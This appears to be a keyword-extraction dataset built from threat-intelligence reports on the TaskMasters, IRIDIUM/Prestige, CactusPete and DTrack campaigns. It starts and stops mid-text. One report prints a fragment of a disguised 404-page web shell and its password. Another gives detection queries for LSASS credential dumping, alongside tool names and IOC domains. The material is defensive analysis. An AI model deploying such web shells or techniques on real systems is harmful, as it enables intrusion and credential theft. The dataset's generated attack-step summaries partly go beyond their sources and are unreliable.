killingWeb shell is detailed in the text of this report. Copying of file timestamps  Enumeration of processes  Enumeration of services  Scanning of network ports  Running of SQL queries  Uploading files from server  Downloading files to serverUtility for extracting authentication information from memory on Windows operating systems: plaintext passwords, password hashes, Windows PIN codes, and Kerberos tickets. Also can perform attacks: pass- the-hash, pass-the-ticket, and others. Freely distributed.Utility for creating process dumps. Part of Sysinternals Tools.Utility for remote command-line management of network hosts. Part of Sysinternals Tools.Utility for viewing a list of processes currently running in the operating system. Part of Sysinternals Tools.Utility for extracting data from *.dbx files, which store Outlook Express folders. Alternative build of dbx_utils source code from the Lucian Wischik utility suite.Program for scanning open ports at a specified IP address or range of IP addresses. Multithreaded scanning.A web shell that acts as a SOCKS proxy server and complements reDuh, which is used for TCP tunneling over HTTP.jsp File browser (web shell)A Java Server Pages web shell for performing simple file operations, such as copying, creating, and delet- ing files. Also supports downloading files as a *.zip archive.* Links to publicly available software and examples of use are given in the listing on page 20.8Technical detailsRemShellThe main software used by the TaskMasters group, RemShell controls infected hosts and consists of two components: RemShell Downloader (downloader)  RemShell (main functionality)Let's look closely at each component.RemShell DownloaderThis component delivers the main payload to the target system. A flowchart illustrating the downloader's operation is given in Figure 8.The downloader accesses an HTML page (the address is set in the downloader's code) and reads the Attribute value of the html tag (see Figure 9). This value is then decrypted. Depending on the value, the downloader either switches to sleep mode or saves the PE file to disk and launches it. The PE file is the payload, containing the main RemShell Trojan.Figure 8. RemShell Downloader flowchartFigure 9. Example HTML fileThe downloader contains a string used for comparison purposes, in order to search for the fragment in the HTML source with the Attribute value (see Figure 10).Figure 10. Substring in HTML file for search purposes9We also analyzed the payload encryption process. It consists of four stages:1. Key preparation (RC4KeyPrepare), with each byte XORed against a constant string. 2. Base64 encoding. 3. RC4 encryption. 4. ZLIB compression.In the downloader code, inside the entry for the RC4 key used for decryption, our ex- perts uncovered friendly wishes from the developers (see Figure 11).Figure 11. RC4 keyRemShellAs the main malware used to control infected hosts, RemShell offers attackers several capabilities:1. Remote control via cmd shell. 2. Downloading of files to remote host. 3. Uploading of files from remote host to C2 server.Note that the malware has two C2 servers. The first C2 server acts as a middleman or proxy that, when requested by the malware, provides the address of the main C2 server. The first C2 server can also send the command to hand off the malware to the other C2 proxy server. Since all changes occur in memory, after a restart the malware will contact the C2 proxy server whose address is indicated in the malware code. Note that the malware will stop working until it receives the address of the main C2 server (see Figure 12).Figure 12. Handoff from the first C2 server to the main C2 serverWe found a number of variations of the malware. For example, some variations lacked the command to upload files from a host to the C2 server. In these cases, the attackers used a custom-developed utility to exfiltrate files. Other variations had commands added to enu- merate running processes and kill processes by PID (process ID).10Configuration data (such as address of the C2 proxy server, port, and user agent) was en- crypted with RC4 and specified in the form of constants in the malware code (see Figure 13).Figure 13. Generation of the key used for network interactionand decryption of configuration dataTraffic between C2 servers and the malware was encrypted with RC4 and additionally encoded with Base64. The RC4 key is generated by calculating an MD5 hash from a constant string. The output of commands from the C2 server is sent as an HTTP request to a URL with the atypical prefix ""1111"".The malware also contains a heartbeat mechanism: at random intervals, the malware sends an HTTP request that contains the output of the hostname command to the specified URL address, with the atypical prefix ""0000"" (see Figure 14).Figure 14. Heartbeat11C2 serversThe server for managing malware infections consists of console ELF files. Figure 15 shows the main loop from the server code, with original function names intact.Figure 15. Main loop of TaskMasters server codeThe interface for server management is implemented as a web shell, supporting the commands listed in Figure 16.Figure 16. Reference list of server commandsThe server keeps a detailed log of all commands sent to the remote host. The log files are stored on disk in encrypted form. Encryption of the log files uses the RC4 algorithm (see Figure 17).Figure 17. Writing to log file12404-Input-shell web shellThe window for logging in to the web shell is disguised as a standard IIS 404 error page. To access the command line and run commands, the attacker must first enter the pass- word. The field for entering the password is hidden: viewing it requires double-clicking the word Back.Figure 18. Error 404 web shell (with hidden password entry form)Listing 1. Event code for displaying the password entry fieldClick the <a href=""#"" ondblclick =""history_back()"">Back</a> button to try another link.</li>13Figure 19. Error 404 web shell (with visible password entry form)The attackers logged in with the password 0p;/9ol., which is the same password they used for encrypting archives. The web shell code contains the MD5 hash of this password.Listing 2. Code of the Error 404 web shell<script runat=""server"">protected void Check(object sender,EventArgs e) {if(FormsAuthentication.HashPasswordForStoringInConfigFile(Request. Visible=false;return;}table1.Visible=false;Info.Visible=true;} GetInfo(object sender,EventArgs e){Response.Write(Path.Combine(Server.MapPath(""""), Path.GetFileName(Lable_File.Value)));try{if(Lable_File.PostedFile.FileName=="""") {Response.Write(""No file to upload"");}else{Lable_File.PostedFile.SaveAs(Path. Combine(Server.MapPath("" ""), Path.GetFileName(Lable_File.Value)));Response.Write("" upload success!"");}}catch(Exception ex){if(ex.InnerException==null){Response.Write(ex. Message);}else{Response.Write(ex.ToString());}}}</script>protected voidIn our investigations, we uncovered a total of three modifications of this web shell with differing functionality, as illustrated in the following screenshots.Figure 20. Error 404 web shell (modification only for uploading files from server)Figure 21. Error 404 web shell (modification only for running OS commands)14Conclusion Our findings confirm that cyberthreats are a real danger for companies across the board, not just banks and financial institutions. In cases such as those outlined here, attackers are motivated not by financial gain, but by access to data and control of information flows.The priority of attackers in these espionage campaigns was long-term stealth on target infrastructure. Victims are usually unaware that they have been attacked. They tend to not have protection systems or skilled security professionals in place, and because there are no ""red flags"" indicating compromise (theft of funds, encrypted hard disks, ransom demands, or clear losses to the business), the cyberincident remains unnoticed.To determine how to protect systems—and most importantly, from whom—incident investigators must carefully consider and analyze the techniques used. When gauging potency, it can be more useful to look at attackers' mistakes (within the target infra- structure) than at their toolkit. Unfortunately, not all companies are prepared in case of a hack or major incident to perform an investigation and round up all artifacts, re- construct the kill chain, and analyze the actions of attackers on infrastructure. But in the hands of a highly qualified team with the capacity to make recommendations for infrastructure protection, incident investigation can have a two-fold benefit: the com- pany's level of protection is improved and future attackers will have to contend with a hardened target environment.15Indicators of compromise 16.mp3.exe 2018-04-223-13-04_a.exe 2018-04-223-13-30_a.exe AA_v3.1.exe At12.jobAt13.job fcopy.fntfcxl.Dll krtf_.Dlll2cx.fnt pdx.datpdx.fnt svohost_1_.exesysinit.dll accountside.zyns.com anata.ooguy.com associates.ddns.us atlasdo.epac.to atlasdo1.epac.to automatically1101.dynu.com bestcash.accesscam.org billing.lflinkup.org bluetraveller.onmypc.net carrot.compress.to clientlogin.jkub.com dbcript.yourtrap.com economic.itsaol.com elp.linkpc.net elp.ns01.us finaldog.giize.com foundbox.zyns.com francegod.mefound.com freestylepannel.dynu.com funsclub.wikaba.com funstraction.ignorelist.comfwiffer.jkub.com game.changeip.org greatland.yourtrap.com happynewlife.mrface.com jailout.sexidude.com jfgi.onedumb.com konwleg.mypop3.net looseup.mywire.org mail3.5wya.com menzu4.25u.com mindme.2waky.com mormorsale.com net17.ns01.info net17.ns1.name newhouse.fartit.com nomotion.mrface.com novnitie.com ns02.ns02.us openfire.https443.net openfire.zzux.com pellguide.myddns.rocks provisioned.kozow.com quatermeter.strangled.net sb1.ns01.biz sb1.ns01.info selfsegmentation.zzux.com sellbase.loseyourip.com slogicroot.com software.zyns.com sound.my03.com spartacus.ezua.com sssbbb.25u.com sssbbb.ddns.me.uk sssbbb.ddns.uk standpay.dynu.com statcountone.dynu.com tec.ns02.us twoseccends.onedumb.com whathelp.mywire.org whogetthis.ddnsfree.com zerofocus.toythieves.com19Software links and references Publicly available software: names AtNow v1.1: url PWDump: url GsecDump: url HTran: url NBTScan: url RAR: url ASPXSpy2014 (web shell): url Mimikatz: url ProcDump: url PSExec: url PSList: url DbxDump Utility: url PortScan: url reGeorg (web shell): url isp File browser (web shell): url available software: examples of use APT18: url where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems/ АРТ29: url АРТ32: url RTM: url Cobalt Group: url АРТ1: url FIN5: url TG-3390 (APT27): url cyberespionage, url APT27: url Daserf: url Lurid: url dissecting-lurid-apt.pdf APT28: url Ke3chang: url apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/ Lazarus Group: url BlackEnergy: url АРТ10: url АРТ33: url АРТ34: url АРТ35: url Positive TechnologiesPositive Technologies is a leading global provider of enterprise security solutions for vulnerability and compliance management, incident and threat analysis, and application protection. Commitment to clients and research has earned Positive Technologies a reputation as one of the foremost authorities on Industrial Control System, Banking, Telecom, Web Application, and ERP security, supported by recognition from the analyst community. Learn more about Positive Technologies at ptsecurity.com.ptsecurity.com info@ptsecurity.com© 2019 Positive Technologies. Positive Technologies and the Positive Technologies logo are trademarks or registered trademarks of Positive Technologies. All other trademarks mentioned herein are the property of their respective owners.Operation Taskmasters_A4.ENG.0002.03 ","{'phrases': ['Gain', 'access', 'PE', 'exploits', 'use', 'Mimikatz', 'pwdump', 'credentials', 'compromised hosts', 'AtNow utility', 'commands', 'RemShell', 'data', 'Utilities', 'web shells', 'scheduled tasks', 'services', 'systems', 'Target', 'servers', 'domain controllers', 'encryption'], 'target': 'Gain; access; PE; exploits; use; Mimikatz; pwdump; credentials; compromised hosts; AtNow utility; commands; RemShell; data; Utilities; web shells; scheduled tasks; services; systems; Target; servers; domain controllers; encryption.'}"
IRIDIUM; the attacker; the Malware; credentials; Privilege Escalation; privileges; Credential Stealer; WinPEAS; PEAS; privilege escalation; Windows; privilege escalation; privilege escalation; credentials; Comsvcs.dll; privilege escalation; privilege escalation; privilege theft; persistence; system information; ransomware; Compromise; compromise.,"[' 1. Prior to deploying ransomware, IRIDIUM used remote execution tools like RemoteExec and Impacket for privilege escalation and credential theft. 2. To deploy ransomware, IRIDIUM copied payloads to admin shares or domain controllers and executed via scheduled tasks, WMI, or group policy. 3. The Prestige ransomware encrypts files with certain extensions and appends .enc, using Crypto++ library. 4. It deletes backups and shadow copies, disables SQL Server, and drops a ransom note. ']","Extract the keywords: www.microsoft.com /en-us/security/blog/2022/10/14/new-prestige-ransomware-impacts-organizations-in-ukraine-and-poland/ New “Prestige” ransomware impacts organizations in Ukraine and Poland ⋮ 10/14/2022November 10, 2022 update: MSTIC has updated this blog to document assessed attribution of DEV- 0960 as IRIDIUM, the actor that executed the Prestige ransomware-style attacks.The Microsoft Threat Intelligence Center (MSTIC) has identified evidence of a novel ransomware campaign targeting organizations in the transportation and related logistics industries in Ukraine and Poland utilizing a previously unidentified ransomware payload. We observed this new ransomware, which labels itself in its ransom note as “Prestige ranusomeware”, being deployed on October 11 in attacks occurring within an hour of each other across all victims. Attribution to IRIDIUMAs of November 2022, MSTIC assesses that IRIDIUM very likely executed the Prestige ransomware-style attack. IRIDIUM is a Russia-based threat actor tracked by Microsoft, publicly overlapping with Sandworm, that has been consistently active in the war in Ukraine and has been linked to destructive attacks since the start of the war. This attribution assessment is based on forensic artifacts, as well as overlaps in victimology, tradecraft, capabilities, and infrastructure, with known IRIDIUM activity. Review of technical artifacts available to Microsoft links IRIDIUM to interactive compromise activity at multiple Prestige victims as far back as March 2022 and continuing within the week leading up to the October 2022 attack discussed in the blog below.The Prestige campaign may highlight a measured shift in IRIDIUM’s destructive attack calculus, signaling increased risk to organizations directly supplying or transporting humanitarian or military assistance to Ukraine. More broadly, it may represent an increased risk to organizations in Eastern Europe that may be considered by the Russian state to be providing support relating to the war.1/7Microsoft would like to acknowledge CERT UA for their cooperation and information sharing to assist in our investigations. CERT UA continues to demonstrate incredible resolve and commitment to security despite physical danger. Observed actor activityThis ransomware campaign had several notable features that differentiate it from other Microsoft-tracked ransomware campaigns:The enterprise-wide deployment of ransomware is not common in Ukraine, and this activity was not connected to any of the 94 currently active ransomware activity groups that Microsoft tracks The Prestige ransomware had not been observed by Microsoft prior to this deployment The activity shares victimology with recent Russian state-aligned activity, specifically on affected geographies and countries, and overlaps with previous victims of the FoxBlade malware (also known as HermeticWiper)Despite using similar deployment techniques, the campaign is distinct from recent destructive attacks leveraging AprilAxe (ArguePatch)/CaddyWiper or Foxblade (HermeticWiper) that have impacted multiple critical infrastructure organizations in Ukraine over the last two weeks. MSTIC has not yet linked this ransomware campaign to a known threat group and is continuing investigations. MSTIC is tracking this activity as IRIDIUM.This blog aims to provide awareness and indicators of compromise (IOCs) to Microsoft customers and the larger security community. Microsoft continues to monitor this and is in the process of early notification to customers impacted by IRIDIUM but not yet ransomed. MSTIC is also actively working with the broader security community and other strategic partners to share information that can help address this evolving threat through multiple channels.Pre-ransomware activitiesPrior to deploying ransomware, the IRIDIUM activity included the use of the following two remote execution utilities:RemoteExec – a commercially available tool for agentless remote code execution Impacket WMIexec – an open-source script-based solution for remote code executionTo gain access to highly privileged credentials, in some of the environments, IRIDIUM used these tools for privilege escalation and credential extraction:winPEAS – an open-source collection of scripts to perform privilege escalation on Windows comsvcs.dll – used to dump the memory of the LSASS process and steal credentials ntdsutil.exe – used to back up the Active Directory database, likely for later use credentialsRansomware deploymentIn all observed deployments, the attacker had already gained access to highly privileged credentials, like Domain Admin, to facilitate the ransomware deployment. Initial access vector has not been identified at this time, but in some instances it’s possible that the attacker might have already had existing access to the highly privileged credentials from a prior compromise. In these instances, the attack timeline starts with the attacker already having Domain Admin-level access and staging their ransomware payload.Most ransomware operators develop a preferred set of tradecraft for their payload deployment and execution, and this tradecraft tends to be consistent across victims, unless a security configuration prevents their preferred method. For this IRIDIUM activity, the methods used to deploy the ransomware varied across the victim environments, but it does not appear to be due to security configurations preventing the attacker from using the same techniques. This is especially notable as the ransomware deployments all occurred within one hour. The distinct methods for ransomware deployment were:Method 1: The ransomware payload is copied to the ADMIN$ share of a remote system, and Impacket is used to remotely create a Windows Scheduled Task on target systems to execute the payload2/7Method 2: The ransomware payload is copied to the ADMIN$ share of a remote system, and Impacket is used to remotely invoke an encoded PowerShell command on target systems to execute the payloadMethod 3: The ransomware payload is copied to an Active Directory Domain Controller and deployed to systems using the Default Domain Group Policy ObjectMalware analysis3/7The “Prestige” ransomware requires administrative privileges to run. Like many ransomware payloads, it attempts to stop the MSSQL Windows service to ensure successful encryption using the following command (the strings “C:\Windows\System32\net.exe stop” and “MSSQLSERVER” are both hardcoded in the analyzed samples):Prestige creates C:\Users\Public\README and stores the following ransom note in the file. The same file is also created in the root directory of each drive:Prestige ransom notePrestige then traverses the files on the file system and encrypts the contents of files that have one of the following hardcoded file extensions, avoiding encrypting files in the C:\Windows\ and C:\ProgramData\Microsoft\ directories:After encrypting each file, the ransomware appends the extension .enc to the existing extension of the file. For example, changes.txt is encrypted and then renamed to changes.txt.enc. Prestige uses the following two commands to register a custom file extension handler for files with .enc file extension:Custom file extension handler for files with .enc extensionAs a result of creating the custom file extension handler, when any file carrying the file extension .enc (i.e., encrypted by Prestige) is opened by a user, the file extension handler uses Notepad to open C:\Users\Public\README, which contains the ransom note.4/7To encrypt files, Prestige leverages the CryptoPP C++ library to AES-encrypt each eligible file. During the encryption process, the following hardcoded RSA X509 public key is used by one version of the ransomware (each version of Prestige may carry a unique public key):To hinder system and file recovery, Prestige runs the following command to delete the backup catalog from the system:Prestige also runs the following command to delete all volume shadow copies on the system:Before running the commands above, the 32-bit version of Prestige calls the function Wow64DisableWow64FsRedirection() to disable file system redirection and gain access to the native System32 directory. After running the commands above, Prestige restores file system redirection by calling the function Wow64RevertWow64FsRedirection().Microsoft will continue to monitor IRIDIUM activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Looking forwardThe threat landscape in Ukraine continues to evolve, and wipers and destructive attacks have been a consistent theme. Ransomware and wiper attacks rely on many of the same security weaknesses to succeed. As the situation evolves, organizations can adopt the hardening guidance below to help build more robust defenses against these threats. Recommended customer actionsThe ransomware payload was deployed by the actor after an initial compromise that involved gaining access to highly privileged credentials. The techniques used by the actor and described in the “Observed Actor Activity” section can be mitigated by adopting the security considerations provided below:Block process creations originating from PSExec and WMI commands to stop lateral movement utilizing the WMIexec component of Impacket. Enable Tamper protection to prevent attacks from stopping or interfering with Microsoft Defender. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. While this attack differs from traditional ransomware, following our defending against ransomware guidance helps protect against the credential theft, lateral movement, and ransomware deployment used by IRIDIUM. Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion.5/7Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity, including VPNs. Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure your accounts.Indicators of compromise (IOCs)The following table lists the IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.Indicator File path of the ransom noteNOTE: These indicators should not be considered exhaustive for this observed activity. Microsoft 365 DefenderMicrosoft Defender AntivirusMicrosoft Defender Antivirus detects known Prestige ransomware payloads with the following detection:Ransom:Win32/PrestigeMicrosoft Defender for EndpointMicrosoft Defender for Endpoint provides alerts for the indicators used by IRIDIUM discussed above.Ransomware-linked emerging threat activity group IRIDIUM detectedMicrosoft Defender for Endpoint also provides alerts for the pre-ransom techniques discussed above.Customers should act on these alerts as they indicate hands-on-keyboard attacks. NOTE: These alerts are not uniquely tied to the Prestige ransomware nor to the campaign discussed.Ongoing hands-on-keyboard attack via Impacket toolkit WinPEAS tool detected Sensitive credential memory read Password hashes dumped from LSASS memory Suspicious scheduled task activity System recovery setting tampering File backups were deletedAdvanced hunting queries6/7Microsoft SentinelPrestige ransomware file hashesThis query looks for file hashes and Microsoft Defender Antivirus detections associated with Prestige ransomware payload.url Sentinel/tree/master/Detections/MultipleDataSources/PrestigeRansomwareIOCsOct22.yamlMicrosoft 365 DefenderImpacket WMIexec usageThis query surfaces Impacket WMIexec usage on a device: DeviceProcessEvents | where Timestamp >= ago(7d) | where FileName =~ ""cmd.exe"" | where InitiatingProcessFileName =~ ""WmiPrvSE.exe""This query has the same purpose as above, but it also groups all the commands launched using Impacket WMIexec on the device: DeviceProcessEvents | where Timestamp >= ago(7d) | where FileName =~ ""cmd.exe"" | where InitiatingProcessFileName =~ ""WmiPrvSE.exe"" | project DeviceName, DeviceId, Timestamp, ProcessCommandLine | summarize make_set(ProcessCommandLine), min(Timestamp), max(Timestamp) by DeviceId, DeviceNameLSASS process memory dumpingThis query surfaces attempts to dump the LSASS process memory comsvcs.dll: let startTime = ago(7d); let endTime = now(); DeviceProcessEvents | where Timestamp between (startTime endTime) | where FileName =~ 'rundll32.exe' and ProcessCommandLine has 'comsvcs.dll' and ProcessCommandLine has_any ('full','MiniDump') | where not (ProcessCommandLine matches regex @'{[\w\d]{8}-[\w\d]{4}-[\w\d]{4}-[\w\d] {4}-[\w\d]{12}}' and ProcessCommandLine matches regex @'(\d{2}_){3}' )7/7 ","{'phrases': ['deploying ransomware', 'IRIDIUM', 'execution', 'RemoteExec', 'Impacket', 'privilege escalation', 'credential theft', 'payloads', 'shares', 'Controller', 'WMI', 'group policy', 'the Prestige ransomware', 'files', 'appends', 'library', 'backups', 'shadow copies', 'NOTE'], 'target': 'deploying ransomware; IRIDIUM; execution; RemoteExec; Impacket; privilege escalation; credential theft; payloads; shares; Controller; WMI; group policy; the Prestige ransomware; files; appends; library; backups; shadow copies; NOTE.'}"
spear-phishing messages; attachments; vulnerabilities; the victim; the attachment; malware; a hardcoded C2; the communication; IP; MAC address; code; commands; Upload/Download/Delete; files; data; Exfiltration; Mimikatz; keyloggers; Credential Harvesting; credentials; data; Mimikatz Backdoors; Mimikatz Droppers; keystrokes; PDF; data.,"[""1. The group conducts reconnaissance on targets of interest, focusing on organizations in certain industries like military, government, and technology companies in Asia and Eastern Europe. 2. They craft phishing emails that appear legitimate and send them to victims' existing email addresses, spoofing the source if needed. 3. The emails contain document attachments that exploit vulnerabilities in common software like Microsoft Office. 4. If the attachment is opened, it installs a CactusPete backdoor like Bisonal or DoubleT on the target system. 5. The malware connects to a hardcoded command and control server address to receive instructions. 6. It exfiltrates detailed system information and files of interest back to the C2 server. 7. The hackers use remote access tools distributed by the malware to explore the network and spread laterally. 8. They harvest credentials via keyloggers and credential stealing tools. 9. The credentials and internal access are leveraged to compromise sensitive data such as military, diplomatic, or technology information. 10. The malware and infrastructure are continuously updated to enable persistent access to breached networks. ""]","Extract the keywords: 8/14/2020CactusPete APT group’s updated Bisonal backdoor | SecurelistCactusPete APT group’s updated Bisonal backdoorsecurelist.com/cactuspete-apt-groups-updated-bisonal-backdoor/97962Konstantin ZykovCactusPete (also known as Karma Panda or Tonto Team) is an APT group that has been publicly known since at least 2013. Some of the group’s activities have been previously described in public by multiple sources. We have been investigating and privately reporting on this group’s activity for years as well. Historically, their activity has been focused on military, diplomatic and infrastructure targets in Asia and Eastern Europe.This is also true of the group’s latest activities.A new CactusPete campaign, spotted at the end of February 2020 by Kaspersky, shows that the group’s favored types of target remain the same. The victims of the new variant of the Bisonal backdoor, according to our telemetry, were from financial and military sectors located in Eastern Europe. Our research started from only one sample, but by using the Kaspersky Threat Attribution Engine (KTAE) we found 300+ almost identical samples. All of them appeared between March 2019 and April 2020. This underlines the speed of CactusPete’s development – more than 20 samples per month. The target location forced the group to use a hardcoded Cyrillic codepage during string manipulations. This is important, for example, during remote shell functionality, to correctly handle the Cyrillic output from executed commands.The method of malware distribution for the new campaign remains unknown, but previous campaigns indicate that it’s their usual way of distributing malware. The attackers’ preferred way to deliver malware is spear-phishing messages with “magic” attachments. The attachments never contain zero-day exploits, but they do include recently discovered and patched vulnerabilities, or any other crafty approaches that might help them deliver the payload. Running these attachments leads to infection.Once the malware starts it tries to reach a hardcoded C2. The communication takes place using the unmodified HTTP-based protocol, the request and response body are RC4- encrypted, and the encryption key is also hardcoded into the sample. As the result of the RC4 encryption may contain binary data, the malware additionally encodes it in BASE64, to match the HTTP specification.1 url handshake consists of several steps: initial request, victim network details and a more detailed victim information request. This is the complete list of victim specific information that is sent to the C2 during the handshake steps:Hostname, IP and MAC address; Windows version; Time set on infected host;url APT group’s updated Bisonal backdoor | SecurelistFlags that indicates if the malware was executed on VMware environment; Proxy usage flag; System default CodePage Identifier;After the handshake has been completed, the backdoor waits for a command, periodically pinging the C2 server. The response body from the C2 ping might hold the command and parameters (optionally). The updated Bisonal backdoor version maintains functionality similar to past backdoors built from the same codebase:Execute a remote shell; Silently start a program on a victim host; Retrieve a list of processes from the victim host; Terminate any process; Upload/Download/Delete files to/from victim host; Retrieve a list of available drives from the victim host; Retrieve a filelist of a specified folder from the victim host;This is what it looks like in code.Screenshot of the C2 command handling subroutineThis set of remote commands helps the attackers study the victim environment for lateral movement and deeper access to the target organization. The group continues to push various custom Mimikatz variants and keyloggers for credential harvesting purposes, along with privilege escalation malware.What are they looking for?Since the malware contains mostly information gathering functionality, most likely they hack into organizations to gain access to the victims’ sensitive data. If we recall that CactusPete targets military, diplomatic and infrastructure organizations, the information could be very sensitive indeed.We would suggest the following countermeasures to prevent such threats:Network monitoring, including unusual behavior detection;url APT group’s updated Bisonal backdoor | SecurelistUp-to-date software to prevent exploitation of vulnerabilities; Up-to-date antivirus solutions; Training employees to recognize email-based (social engineering) attacks;CactusPete activityCactusPete is a Chinese-speaking cyber-espionage APT group that uses medium-level technical capabilities, and the people behind it have upped their game. They appear to have received support and have access to more complex code like ShadowPad, which CactusPete deployed in 2020. The group’s activity has been recorded since at least 2013, although Korean public resources mark an even earlier date – 2009. Historically, CactusPete targets organizations within a limited range of countries – South Korea, Japan, the US and Taiwan. Last year’s campaigns show that the group has shifted towards other Asian and Eastern European organizations.Here’s an overview of CactusPete activity in recent years, based on Kaspersky research results:May 2018: a new wave of targeted attacks abusing CVE-2018-8174 (this exploit has been associated with the DarkHotel APT group, as described on Securelist), with diplomatic, defense, manufacturing, military and government targets in Asia and Eastern Europe; December 2018 and early 2019: Bisonal backdoor modification with a set of spying payloads in a campaign targeting organizations within mining, defense, government and technology research targets in Eastern Europe and Asia; September and October 2019: a DoubleT backdoor campaign, targeting military- related and unknown victims; March 2019 to April 2020: Bisonal backdoor modification in a campaign targeting organizations in financial and military institutions in Eastern Europe; December 2019 to April 2020: a modified DoubleT backdoor campaign, targeting telecom and governmental organizations and other victims in Asia and Eastern Europe; Late 2019 and 2020: CactusPete started to deploy ShadowPad malware with victims including government organizations, energy, mining, and defense bodies and telcoms located in Asia and Eastern Europe;Known alternative names for this APT group: CactusPete, Karma Panda, Tonto TeamKnown alternative names for the different payloads used: Bisonal, Curious Korlia, DoubleT, DOUBLEPIPE, CALMTHORNEIn the end…url APT group’s updated Bisonal backdoor | SecurelistWe call CatusPete an Advanced Persistent Threat (APT) group, but the Bisonal code we analyzed is not that advanced. Yet, interestingly, the CactusPete APT group has had success without advanced techniques, using plain code without complicated obfuscation and spear-phishing messages with “magic” attachments as the preferred method of distribution. Of course, the group does continuously modify the payload code, studies the suggested victim in order to craft a trustworthy phishing email, sends it to an existing email address in the targeted company and makes use of new vulnerabilities and other methods to inconspicuously deliver the payload once an attachment has been opened. The infection occurs, not because of advanced technologies used during the attack, but because of those who view the phishing emails and open the attachments. Companies need to conduct spear-phishing awareness training for employees in order to improve their computer security knowledge.IoCsPDB path: E:\vs2010\new big!\MyServe\Debug\MyServe.pdbMD5: 11B8016045A861BE0518C9C398A79573Related material:January 29, 2020 url March 5, 2020 url 2019 url 2019/presentations/cds19-executive-s08-achievement-unlocked.pdf July 31, 2018 url url url 2013 url ritable/presentations/file_upload/cle-t04_final_v1.pdfurl ","{'phrases': ['the group', 'targets', 'interest', 'organizations', 'military', 'government', 'technology', 'Companies', 'Asia', 'Eastern Europe', 'phishing emails', 'victims', 'address', 'vulnerabilities', 'the attachment', 'CactusPete', 'Bisonal', 'System', 'the malware', 'code', 'information', 'files', 'the C2 server', 'use', 'access', 'keyloggers', 'sensitive data', 'IP', '10', 'infrastructure', 'date'], 'target': 'the group; targets; interest; organizations; military; government; technology; Companies; Asia; Eastern Europe; phishing emails; victims; address; vulnerabilities; the attachment; CactusPete; Bisonal; System; the malware; code; information; files; the C2 server; use; access; keyloggers; sensitive data; IP; 10; infrastructure; date.'}"
PE file; a decrypted code; the DLL; a keylogger; screenshots; system info; lateral movement; tools; TL; files; data; DTrack; detection.,['1. The threat actor spreads the DTrack malware executable through unspecified means. 2. DTrack unpacks its payload in multiple stages using encryption and obfuscation. 3. The first stage code retrieves the second stage shellcode from the executable. 4. The shellcode decrypts the third stage - another shellcode and the final payload. 5. The third stage shellcode locates the encryption key and decrypts the final payload DLL. 6. The DLL is loaded into explorer.exe using process hollowing. 7. DTrack contacts its C2 servers and can execute commands uploaded by the attacker. 8. The attacker uses DTrack to move laterally and compromise additional systems on the network. '],"Extract the keywords: securelist.com /dtrack-targeting-europe-latin-america/107798/ DTrack activity targeting Europe and Latin AmericaAuthorsKonstantin ZykovJornt van der WielIntroductionDTrack is a backdoor used by the Lazarus group. Initially discovered in 2019, the backdoor remains in use three years later. It is used by the Lazarus group against a wide variety of targets. For example, we’ve seen it being used in financial environments where ATMs were breached, in attacks on a nuclear power plant and also in targeted ransomware attacks. Essentially, anywhere the Lazarus group believes they can achieve some financial gain.DTrack allows criminals to upload, download, start or delete files on the victim host. Among those downloaded and executed files already spotted in the standard DTrack toolset there is a keylogger, a screenshot maker and a module for gathering victim system information. With a toolset like this, criminals can implement lateral movement into the victims’ infrastructure in order to, for example, retrieve compromising information.As part of our crimeware reporting service, we published a new private report about recent Dtrack activity. In this public article we highlight some of the main findings shared in that report. For more information about our crimeware reporting service, please contact crimewareintel@kaspersky.com. So, what’s new?1/5DTrack itself hasn’t changed much over the course of time. Nevertheless, there are some interesting modifications that we want to highlight in this blogpost. Dtrack hides itself inside an executable that looks like a legitimate program, and there are several stages of decryption before the malware payload starts.First stage – implanted codeDTrack unpacks the malware in several stages. The second stage is stored inside the malware PE file. To get it, there are two approaches:offset based; resource based.The idea is that DTrack retrieves the payload by reading it from an offset within the file or by reading it from a resource within the PE binary. An example of a decompiled pseudo function that retrieves the data using the offset-based approach can be found below.Example of DTrack offset-oriented retrieval functionAfter retrieving the location of the next stage and its key, the malware then decrypts the buffer (with a modified RC4 algorithm) and passes control to it. To figure out the offset of the payload, its size and decryption keys, DTrack has a special binary (we have dubbed it ‘Decrypt config’) structure hidden in an inconspicuous part of the PE file.Second stage – shellcodeThe second stage payload consists of heavily obfuscated shellcode as can be seen below.2/5Heavily obfuscated second stage shellcodeThe encryption method used by the second layer differs for each sample. So far, we have spotted modified versions of RC4, RC5 and RC6 algorithms. The values of the third stage payload and its decryption key are obtained by reading Decrypt config again.One new aspect of the recent DTrack variants is that the third stage payload is not necessarily the final payload; there may be another piece of binary data consisting of a binary configuration and at least one shellcode, which in turn decrypts and executes the final payload.Third stage – shellcode and final binaryThe shellcode has some quite interesting obfuscation tricks to make analysis more difficult. When started, the beginning of the key (used to decrypt the final payload) is searched for. For example, when the beginning of the key is 0xDEADBEEF, the shellcode searches for the first occurrence of 0xDEADBEEF.3/5Chunk decryption routine exampleOnce the key is found, the shellcode uses it to decrypt the next eight bytes after the key, which form yet another configuration block with final payload size and its entry point offset. The configuration block is followed by an encrypted PE payload that starts at the entry point offset after decryption with the custom algorithm.Final payloadOnce the final payload (a DLL) is decrypted, it is loaded using process hollowing into explorer.exe. In previous DTrack samples the libraries to be loaded were obfuscated strings. In more recent versions they use API hashing to load the proper libraries and functions. Another small change is that three C2 servers are used instead of six. The rest of the payload’s functionality remains the same.InfrastructureWhen we look at the domain names used for C2 servers, a pattern can be seen in some cases. For example, the actors combine a color with the name of an animal (e.g., pinkgoat, purplebear, salmonrabbit). Some of the peculiar names used in the DTrack infrastructure can be found below:Domain 2022‑03‑03 15:34 2022‑05‑20 16:07 2021‑01‑08 08:37 2022‑05‑20 09:37ASN AS17506According to KSN telemetry, we have detected DTrack activity in Germany, Brazil, India, Italy, Mexico, Switzerland, Saudi Arabia, Turkey and the United States, indicating that DTrack is spreading into more parts of the world. The targeted sectors are education, chemical manufacturing, governmental research centers and policy 